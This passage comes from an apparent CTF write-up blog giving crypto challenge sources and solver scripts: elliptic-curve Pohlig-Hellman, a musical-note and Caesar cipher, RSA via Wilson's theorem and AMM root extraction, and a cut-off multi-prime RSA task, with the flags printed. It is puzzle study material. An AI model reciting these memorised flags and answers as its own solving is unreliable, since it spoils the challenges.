class="number">0</span>, self.c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse_mod(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse_mod(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = self.INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_order</span>():</span><br><span class="line">    d = d * c^<span class="number">4</span> % p</span><br><span class="line">    A = <span class="number">2</span> * (a + d) * inverse_mod(a - d, p) % p</span><br><span class="line">    B = <span class="number">4</span> * inverse_mod(a - d, p) % p</span><br><span class="line">    a1 = <span class="number">0</span></span><br><span class="line">    a3 = <span class="number">0</span></span><br><span class="line">    a2 = A*B%p</span><br><span class="line">    a4 = B*B%p</span><br><span class="line">    a6 = <span class="number">0</span></span><br><span class="line">    E=EllipticCurve(GF(p),[a1,a2,a3,a4,a6])</span><br><span class="line">    np=E.cardinality()</span><br><span class="line">    <span class="keyword">return</span> ZZ(np)</span><br><span class="line"></span><br><span class="line">ecc = super_ecc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">L, R, sub_order, order</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.add(P, Q)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">P, x</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.mul(x % order, P)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">L, R, sub</span>):</span><br><span class="line">        L, R = mul(L, (order//sub)), mul(R, (order//sub))</span><br><span class="line"></span><br><span class="line">        m, dic = sqrt(sub).<span class="built_in">round</span>(), <span class="built_in">dict</span>()</span><br><span class="line">        ga = mul(L, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(m + <span class="number">1</span>)):</span><br><span class="line">            dic[<span class="built_in">str</span>(ga)], ga = i, add(ga, L)</span><br><span class="line">        gb = mul(L, (-m))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(sub//m + <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(R) <span class="keyword">in</span> dic:</span><br><span class="line">                sk = i*m + dic[<span class="built_in">str</span>(R)]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub&#125;</span> -&gt; <span class="subst">&#123;sk&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> ZZ(sk)</span><br><span class="line">            R = add(R, gb)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    sk = crt(</span><br><span class="line">        [BSGS(L, R, sub) <span class="keyword">for</span> sub <span class="keyword">in</span> sub_order],</span><br><span class="line">        sub_order</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># order = get_order()</span></span><br><span class="line">order = <span class="number">101194790049284589034264952247851014979635478581961323247248565451562534055248</span></span><br><span class="line">sub_order = [<span class="number">16</span>, <span class="number">113</span>, <span class="number">28921</span>, <span class="number">749971</span>, <span class="number">87374629</span>]</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = (<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,</span><br><span class="line">     <span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line"></span><br><span class="line">sk = Pohlig_Hellman(G, S, sub_order, order)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(sk))</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2022NCTF/" rel="tag">2022NCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-HECTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/HECTF/"
    >HECTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/HECTF/" class="article-date">
  <time datetime="2023-03-14T12:38:01.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="HECTF-2022"><a href="#HECTF-2022" class="headerlink" title="HECTF 2022"></a>HECTF 2022</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♭♫♭♭§‖♭∮♭♯♩‖♭♪‖♩♫‖♭‖♭‖§♭‖♩‖♬♫♭‖‖‖♬∮‖¶♩♭‖♪‖♬♯♭♯♪‖¶¶‖♬♭♭‖♪‖♬♫§=</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>先进行音符解密</p>
<p>然后利用变异凯撒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;EA&gt;N?s:WZgTdPYbMSaYg&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">k=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+k)</span><br><span class="line">    k = k + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#HECTF&#123;Caesar_is_fun&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mygenerate</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line">    q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line">    <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>第一步分先利用威尔逊定理求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">p = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 = <span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 = <span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mydecrypt</span>(<span class="params">A,B</span>):</span><br><span class="line">    ans=<span class="number">1</span></span><br><span class="line">    temp=gmpy2.powmod(-<span class="number">1</span>,<span class="number">1</span>,A)</span><br><span class="line">    <span class="comment">#print(temp)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B+<span class="number">1</span>,A):</span><br><span class="line">        ans=(ans*gmpy2.invert(i,A))%A</span><br><span class="line">    <span class="keyword">return</span> (ans*temp)%A</span><br><span class="line">q = sympy.nextprime(mydecrypt(p,g))</span><br><span class="line">n = p*q</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e2,phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m2)))</span><br><span class="line"><span class="comment">#b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后是e和phi_n不互素，用普通方法求不出来，所以利用AMM算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line">c = <span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">p = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">cp = c % p</span><br><span class="line"></span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line"><span class="built_in">print</span>(mps)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;HECTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(h))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    solution = CRT_list([<span class="built_in">int</span>(mpp)], [p])</span><br><span class="line">    <span class="keyword">if</span> check(solution):</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"><span class="comment">#HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span></span><br><span class="line">p_= <span class="number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line">q_= <span class="number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span></span><br><span class="line">c= <span class="number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line">n= <span class="number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">p_= <span 